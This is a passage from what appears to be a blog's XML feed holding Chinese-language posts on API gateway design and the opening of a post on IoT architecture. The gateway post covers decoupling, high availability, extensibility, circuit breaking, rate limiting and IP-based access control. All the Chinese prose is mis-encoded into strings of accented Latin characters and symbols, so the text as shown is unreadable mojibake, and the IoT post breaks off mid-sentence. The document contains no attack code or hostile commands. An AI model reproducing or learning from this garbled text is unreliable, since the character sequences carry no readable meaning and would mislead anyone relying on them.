ÊúçÂä°Ëß£ËÄ¶Âú®ÂæÆÊúçÂä°Êû∂ÊûÑ‰∏ãÔºåÊï¥‰∏™ÁéØÂ¢ÉÂåÖÊã¨ÊúçÂä°ÁöÑÊèê‰æõËÄÖ„ÄÅÊúçÂä°ÁöÑÊ∂àË¥πËÄÖ„ÄÅÊúçÂä°ËøêÁª¥‰∫∫Âëò„ÄÅÂÆâÂÖ®ÁÆ°ÁêÜ‰∫∫ÂëòÁ≠âÔºåÊØè‰∏™ËßíËâ≤ÁöÑËÅåË¥£ÂíåËø∞Ê±ÇÈÉΩ‰∏çÂêå„ÄÇ‰æãÂ¶ÇÔºöÊúçÂä°Ê∂àË¥πËÄÖÂ∑≤ÁªèÈúÄË¶ÅÊèêÂá∫‰∏Ä‰∫õÊñ∞ÁöÑÊúçÂä°ÈúÄÊ±ÇÔºå‰ª•Âø´ÈÄüÂ∫îÂØπ‰∏öÂä°ÂèòÂåñÔºõÊúçÂä°Êèê‰æõËÄÖÔºå‰Ωú‰∏∫‰∏öÂä°ÊúçÂä°ÁöÑÊ≤âÊ∑ÄÊñπÔºåÂ∏åÊúõ‰øùÊåÅÊúçÂä°ÁöÑÈÄöÁî®ÊÄß‰∏éÁ®≥ÂÆöÊÄßÔºåÂæàÈöæÂ∫îÂØπÂø´ÈÄüÁöÑÂèòÂåñ„ÄÇÊúâ‰∫ÜAPIÁΩëÂÖ≥Ëøô‰∏ÄÂ±ÇÔºåÂèØ‰ª•ÂæàÂ•ΩÁöÑËß£ËÄ¶ÂêÑÊñπÁöÑÁõ∏‰∫í‰æùËµñÂÖ≥Á≥ªÔºåËÆ©ÂêÑÊñπÊõ¥Âä†‰∏ìÊ≥®Ëá™Â∑±ÁöÑÁõÆÊ†á„ÄÇ Ëß£ËÄ¶ÂäüËÉΩ‰∏éÈùûÂäüËÉΩ‰ºÅ‰∏öÂú®ÊääÊúçÂä°Êèê‰æõÁªôÂ§ñÈÉ®ËÆøÈóÆÊó∂ÔºåÈô§‰∫ÜÂÆûÁé∞‰∏öÂä°ÈÄªËæëÂäüËÉΩÂ§ñÔºåËøòÈù¢‰∏¥ËÆ∏Â§öÈùûÂäüËÉΩÊÄßÁöÑË¶ÅÊ±Ç„ÄÇ‰æãÂ¶ÇÔºöÈúÄË¶ÅÈò≤ËåÉÈªëÂÆ¢ÊîªÂáªÔºåÈúÄË¶ÅÂ∫îÂØπÁ™ÅÂèëÁöÑËÆøÈóÆÈáè„ÄÅÈúÄË¶ÅÁ°ÆËÆ§Áî®Êà∑ÁöÑÊùÉÈôêÔºåÈúÄË¶ÅÂØπËÆøÈóÆËøõË°åÁõëÊéßÁ≠â„ÄÇËøô‰∫õÈùûÂäüËÉΩÈÄªËæëÔºå‰∏çËÉΩ‰∏é‰∏öÂä°ÈÄªËæëÁöÑÂºÄÂèëÊ∑∑Âú®‰∏ÄËµ∑ÔºåÈúÄË¶ÅÊúâ‰∏ì‰∏öÁöÑ‰∫∫ÂëòÁîöËá≥‰∏ì‰∏öÁöÑÂõ¢ÈòüÊù•Â§ÑÁêÜ„ÄÇ Ëß£ËÄ¶ÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Êèê‰æõËÄÖÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Êèê‰æõËÄÖÂàÜÂ±û‰∫é‰∏çÂêåÁöÑÂõ¢ÈòüÔºåÂ∑•‰ΩúÊÄßË¥®Ë¶ÅÊ±Ç‰πü‰∏çÁõ∏Âêå„ÄÇÂØπ‰∫éÊúçÂä°Êèê‰æõËÄÖÊù•ËØ¥Ôºå‰ªñ‰∏ªË¶ÅÁöÑËÅåË¥£ÊòØÂØπ‰∏öÂä°ËøõË°åÊäΩË±°ÔºåÊèê‰æõÂèØÂ§çÁî®ÁöÑ‰∏öÂä°ÂäüËÉΩÔºå‰ªñ‰ª¨ÈúÄË¶ÅÂØπ‰∏öÂä°Ê®°ÂûãËøõË°åÊ∑±ÂÖ•ÁöÑÊÄùËÄÉÂíåÊ≤âÊ∑ÄÔºå‰∏çËÉΩËΩªÊòì‰∏∫‰∫ÜÂìçÂ∫îÂ§ñÈÉ®ÁöÑÈúÄÊ±ÇËÄåÁ†¥Âùè‰∏öÂä°Ê®°ÂûãÁöÑÁ®≥ÂÆöÊÄß„ÄÇËÄå‰∏öÂä°ÁöÑÂø´ÈÄüÂèòÂåñÔºåÂèàË¶ÅÊ±Ç‰ºÅ‰∏öÂø´ÈÄüÊèê‰æõÊé•Âè£Êù•Êª°Ë∂≥ÂÆ¢Êà∑Á´ØÈúÄÊ±Ç„ÄÇËøôÂ∞±ÈúÄË¶Å‰∏Ä‰∏™‰∏≠Èó¥Â±ÇÔºåÊù•ÂØπÊúçÂä°Â±ÇÁöÑÊé•Âè£ËøõË°åÂ∞ÅË£ÖÔºå‰ª•ÂèäÊó∂ÂìçÂ∫îÂÆ¢Êà∑Á´ØÁöÑÈúÄÊ±Ç„ÄÇÈÄöËøáËß£ËÄ¶ÔºåÊúçÂä°Â±ÇÂèØ‰ª•‰ΩøÁî®Áªü‰∏ÄÁöÑÊé•Âè£„ÄÅÂçèËÆÆÂíåÊä•ÊñáÊ†ºÂºèÊù•Êö¥Èú≤ÊúçÂä°ÔºåËÄå‰∏çÂøÖËÄÉËôëÂÆ¢Êà∑Á´ØÁöÑÂ§öÁßçÂΩ¢ÊÄÅ„ÄÇÈÇ£‰πà ÁΩëÂÖ≥Â±ÇÊòØÂê¶ÈúÄË¶ÅÂÆûÁé∞ÊúçÂä°ÁöÑÁºñÊéíÔºüÂú®‰ªãÁªçAPIÁΩëÂÖ≥ÁöÑ‰∏Ä‰∫õÊñáÁ´†‰∏≠ÔºåÊèêÂà∞‰∫ÜÁΩëÂÖ≥Â±ÇÁöÑÊúçÂä°ÁºñÊéíËÉΩÂäõ„ÄÇ‰ªéËß£ËÄ¶ÁöÑËßíÂ∫¶Âá∫ÂèëÔºåÊúçÂä°ÁöÑÁºñÊéí‰∏çÈÄÇÂêàÂú®ÁΩëÂÖ≥Â±ÇËøõË°å„ÄÇÂØπÊúçÂä°ÁöÑÁºñÊéíÔºåÂÖ∂ÂÆûÊòØÊèê‰æõ‰∫Ü‰∏ÄÁßç‰∏öÂä°ËÉΩÂäõÔºåÂ¶ÇÊûúÊääÊúçÂä°ÁöÑÁºñÊéíÊîæÂú®‰∫ÜÁΩëÂÖ≥Â±ÇÔºåÂÆûÈôÖ‰∏äÊòØÊää‰∏ÄÈÉ®ÂàÜ‰∏öÂä°ËÉΩÂäõÊîæÂú®‰∫ÜÁΩëÂÖ≥Â±ÇÔºåËøôÊ†∑‰∏ÄÊù•ÔºåÊúçÂä°Â±Ç„ÄÅÁΩëÂÖ≥Â±ÇÈÉΩÊúâ‰∏Ä‰∫õ‰∏öÂä°ËÉΩÂäõÔºåÈÄ†ÊàêÂõ¢ÈòüËÅåË¥£ÁöÑ‰∏çÊ∏ÖÔºå‰πü‰∏çÂà©‰∫é‰∏öÂä°ËÉΩÂäõÁöÑÊ≤âÊ∑Ä„ÄÇ ËæÖÂä©ÂäüËÉΩÁΩëÂÖ≥Â±ÇÈô§‰∫ÜËØ∑Ê±ÇÁöÑË∑ØÁî±„ÄÅËΩ¨ÂèëÂ§ñÔºåËøòÈúÄË¶ÅË¥üË¥£ÂÆâÂÖ®„ÄÅÈâ¥ÊùÉ„ÄÅÈôêÊµÅ„ÄÅÁõëÊéßÁ≠â„ÄÇËøô‰∫õÂäüËÉΩÁöÑÂÆûÁé∞ÊñπÂºèÔºåÂæÄÂæÄÈöèÁùÄ‰∏öÂä°ÁöÑÂèòÂåñ‰∏çÊñ≠Ë∞ÉÊï¥„ÄÇ‰æãÂ¶ÇÊùÉÈôêÊéßÂà∂ÊñπÈù¢ÔºåÊó©ÊúüÂèØËÉΩÂè™ÈúÄË¶ÅÁÆÄÂçïÁöÑÁî®Êà∑+ÂØÜÁ†ÅÊñπÂºèÔºåÂêéÁª≠Áî®Êà∑ÈáèÂ§ß‰∫ÜÂêéÔºåÂèØËÉΩ‰ºö‰ΩøÁî®È´òÊÄßËÉΩÁöÑÁ¨¨‰∏âÊñπËß£ÂÜ≥ÊñπÊ°à„ÄÇÂèà‰æãÂ¶ÇÔºåÈíàÂØπ‰∏çÂêåÁöÑÁõëÊéßÊñπÊ°àÔºåÈúÄË¶ÅËÆ∞ÂΩï‰∏çÂêåÁöÑÊó•ÂøóÊñá‰ª∂„ÄÇÊâÄ‰ª•ÔºåËøô‰∫õËÉΩÂäõ‰∏çËÉΩ‰∏ÄÂºÄÂßãÂ∞±Âõ∫ÂåñÂú®ÁΩëÂÖ≥Âπ≥Âè∞‰∏äÔºåËÄåÂ∫îËØ•ÊòØ‰∏ÄÁßçÂèØÈÖçÁΩÆÁöÑÊñπÂºèÔºå‰æø‰∫é‰øÆÊîπÂíåÊõøÊç¢„ÄÇËøôÂ∞±Ë¶ÅÊ±ÇÁΩëÂÖ≥Â±ÇÊèê‰æõ‰∏ÄÂ•óÊú∫Âà∂ÔºåÂèØ‰ª•ÂæàÂ•ΩÂú∞ÊîØÊåÅËøôÁßçÂä®ÊÄÅÊâ©Â±ï„ÄÇ ÊÄªÁªìÊúâ‰∫ÜAPIÁΩëÂÖ≥Âêé, ‰ºöÊúâ‰ª•‰∏ã‰ºòÁÇπ ÁΩëÂÖ≥Â±ÇÂØπÂ§ñÈÉ®ÂíåÂÜÖÈÉ®ËøõË°å‰∫ÜÈöîÁ¶ªÔºå‰øùÈöú‰∫ÜÂêéÂè∞ÊúçÂä°ÁöÑÂÆâÂÖ®ÊÄß„ÄÇ ÂØπÂ§ñËÆøÈóÆÊéßÂà∂Áî±ÁΩëÁªúÂ±ÇÈù¢ËΩ¨Êç¢Êàê‰∫ÜËøêÁª¥Â±ÇÈù¢ÔºåÂáèÂ∞ëÂèòÊõ¥ÁöÑÊµÅÁ®ãÂíåÈîôËØØÊàêÊú¨ ÂáèÂ∞ëÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°ÁöÑËÄ¶ÂêàÔºåÊúçÂä°ÂèØ‰ª•Áã¨Á´ãÂèëÂ±ï„ÄÇÈÄöËøáÁΩëÂÖ≥Â±ÇÊù•ÂÅöÊò†Â∞Ñ„ÄÇ ÈÄöËøáÁΩëÂÖ≥Â±ÇËÅöÂêàÔºåÂáèÂ∞ëÂ§ñÈÉ®ËÆøÈóÆÁöÑÈ¢ëÊ¨°ÔºåÊèêÂçáËÆøÈóÆÊïàÁéá„ÄÇ ËäÇÁ∫¶ÂêéÁ´ØÊúçÂä°ÂºÄÂèëÊàêÊú¨ÔºåÂáèÂ∞ë‰∏äÁ∫øÈ£éÈô©„ÄÇ ‰∏∫ÊúçÂä°ÁÜîÊñ≠ÔºåÁÅ∞Â∫¶ÂèëÂ∏ÉÔºåÁ∫ø‰∏äÊµãËØïÊèê‰æõÁÆÄÂçïÊñπÊ°à„ÄÇ ‰æø‰∫éÊâ©Â±ï„ÄÇ ËÆæËÆ°Ë¶ÅÊ±ÇÈÇ£‰πàAPIÁΩëÂÖ≥Âú®ËÆæËÆ°Êó∂ÈúÄË¶ÅËÄÉËôëÂà∞ÈÇ£‰∫õÁÇπÂñÉÔºü È´òÊÄßËÉΩÁΩëÂÖ≥‰Ωú‰∏∫Â∫îÁî®ËÆøÈóÆÁöÑÂîØ‰∏ÄÂÖ•Âè£, ÊâÄÊúâÁöÑËØ∑Ê±ÇÈÉΩ‰ºöÁªèËøáAPIÁΩëÂÖ≥ËøõË°åËΩ¨Âèë, ÂèØÊÉ≥ËÄåÁü•, ÂØπAPIÁΩëÂÖ≥ÁöÑËÆøÈóÆÂéãÂäõÊòØÂ∑®Â§ßÁöÑ„ÄÇÂõ†Ê≠§APIÁΩëÂÖ≥ÂØπÊÄßËÉΩË¶ÅÊ±ÇÊØîËæÉÈ´ò, ÊÄßËÉΩ‰∏äËá≥Â∞ë‰∏çËÉΩÊØînginxÂº±Â§™Â§ö, Âõ†Ê≠§‰∏öÂÜÖ‰ΩøÁî®nginx + luaÁöÑÊØîËæÉÂ§ö„ÄÇ È´òÂèØÁî®APIÁΩëÂÖ≥‰Ωú‰∏∫ÈÄªËæë‰∏äÁöÑÂçïÁÇπÔºå‰∏ÄÊó¶ÂèëÁîüÈóÆÈ¢òÔºåÂ∞ÜÈÄ†ÊàêÊâÄÊúâÊúçÂä°ÁöÑ‰∏çÂèØÁî®ÔºåÂØπ‰ºÅ‰∏öÊù•ËØ¥ÂèØËÉΩÈÄ†ÊàêÁöÑËá¥ÂëΩÁöÑÂΩ±Âìç„ÄÇËÆ°ÁÆóÁü≠Êó∂Èó¥ÁöÑ‰∏çÂèØÁî®Ôºå‰πü‰ºöÁªô‰ºÅ‰∏öÂ∏¶Êù•Áõ¥Êé•ÁöÑÁªèÊµéÊçüÂ§±„ÄÇÊâÄ‰ª•ÔºåÂ¶Ç‰Ωï‰øùËØÅAPIÁΩëÂÖ≥ÁöÑ7*24Â∞èÊó∂ÁöÑÁ®≥ÂÆöËøêË°å, Âõ†Ê≠§ ÁΩëÂÖ≥Âú®ÂÆûÁé∞Êó∂‰∏ÄÂÆöË¶ÅËÄÉËôëÊ®™ÂêëÊâ©Â±ïÂíåAPIÁÉ≠Êõ¥Êñ∞ÁöÑËÉΩÂäõ, ÈÅøÂÖçAPIÁΩëÂÖ≥ÂÆïÊú∫„ÄÇ È´òÊâ©Â±ïÂâçÈù¢ËØ¥Âà∞, ‰∏Ä‰∫õÈùû‰∏öÂä°ÂäüËÉΩÁöÑÈúÄÊ±ÇÈúÄË¶ÅÁΩëÂÖ≥Êèê‰æõ, ÊØîÂ¶Ç: ‰æãÂ¶ÇÊó•Âøó„ÄÅÂÆâÂÖ®„ÄÅË¥üËΩΩÂùáË°°Á≠ñÁï•„ÄÅÈâ¥ÊùÉÁ≠â, ËøôÂ∞±ÈúÄË¶ÅÁΩëÂÖ≥Â±ÇÊèê‰æõËøôÊ†∑‰∏ÄÁßçÊú∫Âà∂Ôºå‰ΩøÂæóÂèØ‰ª•ÁÅµÊ¥ªÂú∞ËøõË°åËøô‰∫õË∞ÉÊï¥ÂíåÂèòÂåñÔºåËÄå‰∏çÁî®È¢ëÁπÅÂØπÁΩëÂÖ≥Â±ÇËøõË°åÊîπÂä®ÔºåÁ°Æ‰øùÁΩëÂÖ≥Â±ÇÁöÑÁ®≥ÂÆöÊÄß„ÄÇÊØîÂ¶ÇnginxÈááÁî®Ê®°ÂùóÊù•ËøõË°åÊâ©Â±ï, Âπ∂‰∏îÊîØÊåÅÊ®°ÂùóÁöÑÂä®ÊÄÅÂä†ËΩΩ„ÄÇ È´òËøêÁª¥APIÂú®‰∏äÁ∫ø„ÄÅÂèëÂ∏ÉËøáÁ®ã‰∏≠ÔºåÈÉΩÈúÄË¶ÅÊ∂âÂèäÂà∞ÁΩëÂÖ≥Â±ÇÁöÑÈÖçÂêàÔºå‰æãÂ¶ÇÔºåÈúÄË¶ÅÁΩëÂÖ≥Â±ÇÁü•ÈÅìAPIÂèëÂ∏ÉÁöÑÂú∞ÂùÄÔºåAPIÁöÑÊé•Âè£ÂΩ¢Âºè„ÄÅÊä•ÊñáÊ†ºÂºèÔºå‰πüÈúÄË¶ÅÁΩëÂÖ≥Â±ÇÂØπÂêéÂè∞APIËøõË°åÂ∞ÅË£Ö„ÄÇÂú®APIË∞ÉÊï¥ÂêéÔºåÈúÄË¶Å‰ΩúÂá∫Áõ∏Â∫îÁöÑ‰øÆÊîπ„ÄÇÊâÄ‰ª•ÔºåAPIÁΩëÂÖ≥ËÆæËÆ°Êó∂ÔºåÈúÄË¶ÅÊòéÁ°ÆÁΩëÂÖ≥Â±Ç‰∏éÊúçÂä°Â±ÇÁöÑËÅåË¥£ÂàáÂàÜ‰∏éÂçè‰ΩúÊ®°ÂºèÔºå‰ΩøÂæóAPIÁöÑÁÆ°ÁêÜ„ÄÅÂèëÂ∏ÉÊõ¥Âä†È´òÊïà„ÄÇ ËêΩÂú∞ÊñπÊ°àÈíàÂØπ‰ª•‰∏äÁöÑÈúÄË¶Å, Â¶Ç‰ΩïËÆæËÆ°‰∏ÄÊ¨æËøòÈù†Ë∞±ÁöÑAPIÁΩëÂÖ≥ÂñÉ? ËÆæËÆ°ÂéüÂàô È´òÊÄßËÉΩ: ÈááÁî®GolangÊù•ËøõË°åÂºÄÂèë, Á°Æ‰øùÊÄßËÉΩ È´òÂèØÁî®: 1. ÁΩëÂÖ≥Â±ÇÈááÁî®Êó†Áä∂ÊÄÅËÆæËÆ°, Â∞ÜËÆ§ËØÅÊ®°ÂùóÁã¨Á´ãÂ§ÑÁêÜ 2. ‰ºòÈõÖ‰∏ãÁ∫ø, ÈááÁî®go ÁöÑgracefulÂÅöÂ§ÑÁêÜ È´òÊâ©Â±ï: ÈááÁî®http‰∏≠Èó¥‰ª∂ÁöÑÊñπÂºè, Êèê‰æõÁÅµÊ¥ªÁöÑÊâ©Â±ïËÉΩÂäõ ÂäüËÉΩÁÇπ‰∏Ä‰∏™ÂÆåÊï¥ÁöÑAPIÁΩëÂÖ≥Â∫îËØ•ÂÖ∑ÊúâÂ¶Ç‰∏ãÂá†ÊñπÈù¢ÁöÑÂäüËÉΩ: ÊúçÂä°ÂèëÁé∞, Ë¥üËΩΩÂùáË°°, ÊúçÂä°ÂÅ•Â∫∑Áä∂ÊÄÅÊ£ÄÊü•API GatewayÈúÄË¶ÅÁü•ÈÅìÊØè‰∏Ä‰∏™ÂæÆÊúçÂä°ÁöÑIPÂíåÁ´ØÂè£„ÄÇÂú®‰º†ÁªüÂ∫îÁî®‰∏≠Ôºå‰Ω†ÂèØËÉΩ‰ºöÁ°¨ÁºñÁ†ÅËøô‰∫õÂú∞ÂùÄÔºå‰ΩÜÊòØÂú®Áé∞Âú®‰∫ëÂü∫Á°ÄÁöÑÂæÆÊúçÂä°Â∫îÁî®‰∏≠ÔºåËøôÂ∞ÜÊòØ‰∏™ÁÆÄÂçïÁöÑÈóÆÈ¢ò„ÄÇÂü∫Á°ÄÊúçÂä°ÈÄöÂ∏∏‰ºöÈááÁî®ÈùôÊÄÅÂú∞ÂùÄÔºåÂèØ‰ª•ÈááÁî®Êìç‰ΩúÁ≥ªÁªüÁéØÂ¢ÉÂèòÈáèÊù•ÊåáÂÆö„ÄÇ‰ΩÜÊòØÔºåÊé¢ÊµãÂ∫îÁî®ÊúçÂä°ÁöÑÂú∞ÂùÄÂ∞±Ê≤°ÈÇ£‰πàÂÆπÊòì‰∫Ü„ÄÇÂ∫îÁî®ÊúçÂä°ÈÄöÂ∏∏Âä®ÊÄÅÂàÜÈÖçÂú∞ÂùÄÂíåÁ´ØÂè£„ÄÇÂêåÊ†∑ÁöÑÔºåÁî±‰∫éÊâ©Â±ïÊàñËÄÖÂçáÁ∫ßÔºåÊúçÂä°ÁöÑÂÆû‰æã‰πü‰ºöÂä®ÊÄÅÁöÑÊîπÂèò„ÄÇÂõ†Ê≠§ÔºåAPI GatewayÈúÄË¶ÅÈááÁî®Á≥ªÁªüÁöÑÊúçÂä°ÂèëÁé∞Êú∫Âà∂ÔºåË¶Å‰πàÈááÁî®ÊúçÂä°Á´ØÂèëÁé∞ÔºåË¶Å‰πàÊòØÂÆ¢Êà∑Á´ØÂèëÁé∞„ÄÇÂ¶ÇÊûúÈááÁî®ÂÆ¢Êà∑Á´ØÂèëÁé∞ÊúçÂä°ÔºåAPI GatewayÂøÖÈ°ªË¶ÅÂéªÊü•ËØ¢ÊúçÂä°Ê≥®ÂÜåÂ§ÑÔºå‰πüÂ∞±ÊòØÂæÆÊúçÂä°ÂÆû‰æãÂú∞ÂùÄÁöÑÊï∞ÊçÆÂ∫ì„ÄÇÂèëÁé∞‰∫ÜÂ§ö‰∏™ÂæÆÊúçÂä°ÁöÑÂÆû‰æãËøáÂêé, ÈúÄË¶ÅÈááÁî®Ë¥üËΩΩÂùáË°°Êú∫Âà∂ËøõË°åË∞ÉÂ∫¶, Âπ∂‰∏îÈúÄË¶ÅÊ£ÄÊü•ÊúçÂä°Áä∂ÊÄÅ, ÂΩìÊúçÂä°Á¶ªÁ∫øÊó∂, ËØ∑Ê±ÇÂ∞Ü‰∏ç‰ºöË∞ÉÂ∫¶Âà∞ËØ•ËäÇÁÇπ„ÄÇ ÁÜîÊñ≠Ê®°Âºè‰πüÂè´circuit breakÊ®°ÂºèÔºåÂÆÉÂèØ‰ª•Â∞ÜÂÆ¢Êà∑Á´Ø‰ªéÊó†ÂìçÂ∫îÊúçÂä°ÁöÑÊó†Â∞ΩÁ≠âÂæÖ‰∏≠ÂÅúÊ≠¢„ÄÇÂ¶ÇÊûú‰∏Ä‰∏™ÊúçÂä°ÁöÑÈîôËØØÁéáË∂ÖËøáÈ¢ÑËÆæÂÄºÔºåÂ∞Ü‰∏≠Êñ≠ÊúçÂä°ÔºåÂπ∂‰∏îÂú®‰∏ÄÊÆµÊó∂Èó¥ÂÜÖÊâÄÊúâËØ∑Ê±ÇÁ´ãÂàªÂ§±Êïà„ÄÇÂÖ∑‰ΩìÂèØ‰ª•ÂèÇËÄÉ: ÁÜîÊñ≠Âô® ÈÄüÁéáÈôêÂà∂Êó†ËÆ∫Â¶Ç‰Ωï ‰Ω†ÂêéÁ´ØÁöÑÊúçÂä°ËµÑÊ∫ê‰∏çÂèØËÉΩÊó†ÈôêÂä®ÊÄÅÊâ©Â±ï, ÁªàÊúâËØª, ‰∏∫‰∫Ü‰øùÊä§ÂêéÁ´ØÊúçÂä°‰∏çË¢´ÂáªÂûÆ, ÂèØ‰ª•Âú®ÁΩëÂÖ≥Â±ÇÂÅöËÆøÈóÆÈÄüÁéáÁöÑÈôêÂà∂„ÄÇ Âü∫‰∫éIPÁöÑËÆøÈóÆÊéßÂà∂Ëøô‰∏™ÊòØWAFÁöÑÂü∫Êú¨ÂäüËÉΩ, ÈÅøÂÖçDOS, Â∞ÅÈîÅÊüê‰∏™IPÁöÑÊÅ∂ÊÑèËÆøÈóÆ„ÄÇ ÂçèËÆÆËΩ¨Êç¢ÁΩëÂÖ≥Êèê‰æõRESTfulÁöÑHTTPÁöÑÊé•Âè£, ‰ΩÜÊòØÂêéÁ´Ø ÂèØËÉΩÊèê‰æõÊúçÂä°ÁöÑÂçèËÆÆÂèØËÉΩÂêÑ‰∏çÁõ∏ÂêåÈÄö, ÊØîÂ¶ÇgRPC, HTTP, MQ, Á≠â„ÄÇÂõ†Ê≠§ÁΩëÂÖ≥Â∫îËØ•ËÉΩÈÄÇÈÖçÂ§öÂçèËÆÆÁöÑÊîØÊåÅ„ÄÇ ËØ∑Ê±ÇË∑ØÁî±Âü∫‰∫éURLÁöÑË∑ØÁî±ÂäüËÉΩ API‰ΩøÁî®ÁªüËÆ°ËÆ∞ÂΩïAPI MetricÂ¶ÇËØ∑Ê±ÇÊ¨°Êï∞„ÄÅËØ∑Ê±ÇÂ§ßÂ∞è„ÄÅÂìçÂ∫îÁä∂ÊÄÅÂíåÂª∂ËøüÔºåÂèØËßÜÂåñAPI Metric ÂèÇËÄÉÊµÖË∞à API GatewayÂæÆÊúçÂä°Êû∂ÊûÑ‰∏≠ÁöÑAPI GatewayÂæÆÊúçÂä°ÂÆûÊàòÔºà‰∫åÔºâÔºö‰ΩøÁî®API Gateway‰ºÅ‰∏öÁ∫ßAPIÁΩëÂÖ≥ÁöÑËÆæËÆ°Èù¢ÂêëÊúçÂä°Êû∂ÊûÑ]]></content>
      <categories>
        <category>ÂæÆÊúçÂä°</category>
        <category>APIGateway</category>
      </categories>
      <tags>
        <tag>APIGateway</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOTÊû∂ÊûÑ]]></title>
    <url>%2F2017%2F07%2F17%2Fiot-architecture%2F</url>
    <content type="text"><![CDATA[ÊúÄËøëÂºÄÂèë‰∫Ü‰∏ÄÊ¨°IOTÁªÑ‰ª∂, Âú®Ê≠§ÊúüÈó¥‰πüÂèÇËÄÉ‰∫Ü‰∏ãÂÖ∂‰ªñIOTÂπ≥Âè∞ÁöÑËÆæËÆ°Êû∂ÊûÑ, ÊúâÊâÄÊÑüÊÉ≥, Âõ†Ê≠§Â∞ÜÂÖ∂ËÆ∞ÂΩï‰∏ãÊù•, ÂíåÂ§ßÂÆ∂ÂàÜ‰∫´, Ê¨¢Ëøé‰∫§ÊµÅ„ÄÇ IOTÊòØ‰ªÄ‰πàIoTÊòØInternet of ThingsÁöÑÁº©ÂÜô, ÂÆÉÊòØ‰∫íËÅîÁΩë‰ªé‰∫∫ÂêëÁâ©ÁöÑÂª∂‰º∏, Ê†∏ÂøÉÂíåÂü∫Á°Ä‰ªçÁÑ∂ÊòØ‰∫íËÅîÁΩëÊäÄÊúØÔºåÊòØ‰∫íËÅîÁΩëÊäÄÊúØÂü∫Á°Ä‰∏äÁöÑÂª∂‰º∏ÂíåÊâ©Â±ï„ÄÇ ÂÆÉÂ∞ÜÂêÑÁßç‰ø°ÊÅØ‰º†ÊÑüËÆæÂ§áÔºåÂ¶ÇÂ∞ÑÈ¢ëËØÜÂà´Ë£ÖÁΩÆ„ÄÅÁ∫¢Â§ñÊÑüÂ∫îÂô®„ÄÅÂÖ®ÁêÉÂÆö‰ΩçÁ≥ªÁªü„ÄÅÊøÄÂÖâÊâ´ÊèèÂô®Á≠âÁßçÁßçË£ÖÁΩÆ, ÊåâÁ∫¶ÂÆöÁöÑÂçèËÆÆ, Â∞Ü‰ªª‰ΩïÁâ©ÂìÅ‰∏é‰∫íËÅîÁΩëÁõ∏ËøûÊé•, ËææÂà∞Áâ©ÂìÅ‰πãÈó¥ËøõË°å‰ø°ÊÅØ‰∫§Êç¢ÂíåÈÄöËÆØÁöÑÁõÆÁöÑÔºå‰ª•ÂÆûÁé∞Êô∫ËÉΩÂåñËØÜÂà´„ÄÅÂÆö‰Ωç„ÄÅËøΩË∏™„ÄÅÁõëÊéßÂíåÁÆ°ÁêÜÁ≠â„ÄÇIOT‰πüÂ∞ÜÂä†ÈÄüAIÁöÑËßâÈÜí, ÂÆÉÂ∞Ü‰∏áÁâ©‰∫íËÅî, ÂÜçÂä†‰∏äÊàêÁÜüÁöÑÂ§ßÊï∞ÊçÆÂ§ÑÁêÜ, Ê∑±Â∫¶Â≠¶‰π†ÁöÑÂ∫îÁî® ‰ºöËÆ©‰∏áÁâ©ÈÉΩÂ∏¶ÊúâÁÅµÊÄß, ËøôÊòØÂ§ö‰πàÂÆèÂ§ßÁöÑ‰∏Ä‰∏™Êó∂‰ª£, 2016Ë¢´Áß∞‰∏∫AIÁöÑÂÖÉÂπ¥, ÈöèÁùÄIOTÁöÑÂä†ÈÄü, Êàë‰ª¨Â∞ÜÊòØËøôÊ†∑‰∏Ä‰∏™Êó∂‰ª£ÁöÑËßÅËØÅËÄÖ,ËßÅËØÅAIËßâÈÜíÁöÑÁ¨¨‰∏Ä‰ª£‰∫∫„ÄÇ‰∏ãÈù¢ÊòØ‰∏ÄÂº†Áâ©ËÅîÁΩëÂú®Â∑•‰∏öÂºïÁî®ÁöÑ‰∏ÄÂº†ÂõæËøôÊ†∑ÁúãÊù•Êú™Êù•ÂæàÁæéÂ•Ω, ‰ΩÜÊòØÁé∞ÂÆûÂæàÊÆãÈÖ∑, Â¶Ç‰ΩïÂÆûÁé∞ËêΩÂú∞‰∏ÄÂ•óÂèØÈù†ÁöÑIOTÊñπÊ°à‰ªªÁÑ∂ÊòØ‰∏™ÈöæÈ¢ò, Âú®ÂèÇËÄÉ‰∫Ü‰∏Ä‰∫õÂõΩÂ§ñÁöÑÊñπÊ°àËøáÂêé, ÁªìÂêàËá™Â∑±ÁöÑÂÆûË∑µ, ÁªôÂá∫‰∫Ü‰∏ÄÁßçÊàëËÆ§‰∏∫ÁöÑÂèØËêΩÂà∞ÁöÑIOTÊñπÊ°àÊû∂ÊûÑ„ÄÇ IOTÁöÑÈöæÁÇπIOTÂú®ËêΩÂú∞ËøáÁ®ã‰∏≠ÊúâËØ∏Â§öÈöæÁÇπ, ÂõΩÂÜÖÂæàÂ§öIOT‰πüÊòØÂàöËµ∑Ê≠•ÁöÑÁä∂ÊÄÅ, ËÉΩÂèÇËÄÉÁöÑÂ∞±ÂõΩÂ§ñÂá†ÂÆ∂‰∫ëÁöÑÂ§ßÂéÇÂïÜ„ÄÇ Ê∂âÂèäÊäÄÊúØ‰ºóÂ§öIOTÊ∂âÂèäÂà∞ÂæàÂ§öÊäÄÊúØ, ‰∏ãÈù¢‰∏ÄÂº†Âõæ ‰ªéÂá†‰∏™Áª¥Â∫¶Â±ïÁ§∫‰∫ÜIOTÊ∂âÂèäÂà∞ÁöÑ‰∏Ä‰∫õÊäÄÊúØÁÇπ:‰ªéÊäÄÊúØ‰∏äÁúã, Ê∂âÂèä‰ºóÂ§öÊäÄÊúØ, Âõ†Ê≠§ÂØπÂºÄÂèëËÄÖÊúâ‰∏ÄÂÆöÁöÑË¶ÅÊ±Ç, Êãõ‰∫∫ÊòØ‰∏™ÈóÆÈ¢ò„ÄÇ Êû∂ÊûÑÈöæËÆæËÆ°IOTÈù¢ÂØπÁöÑÊòØ‰∏áÁâ©, Âú®‰∏áÁâ©Êé•ÂÖ•Êó∂ÈúÄË¶ÅËÄÉËôëÂà∞ Êï∞ÊçÆÁöÑÂÆâÂÖ®, ÈìæÊé•ÁöÑÁÆ°ÁêÜ, Êµ∑ÈáèÊµÅÊï∞ÊçÆ‰∏ä‰º†, Êµ∑ÈáèÊï∞ÊçÆÁöÑÂ≠òÂÇ® ÁÆ°ÁêÜ ÂàÜÊûê„ÄÇÁªºÂêàÊù•ËØ¥ Êû∂ÊûÑËÆæËÆ°ÂøÖÈ°ªÊª°Ë∂≥: 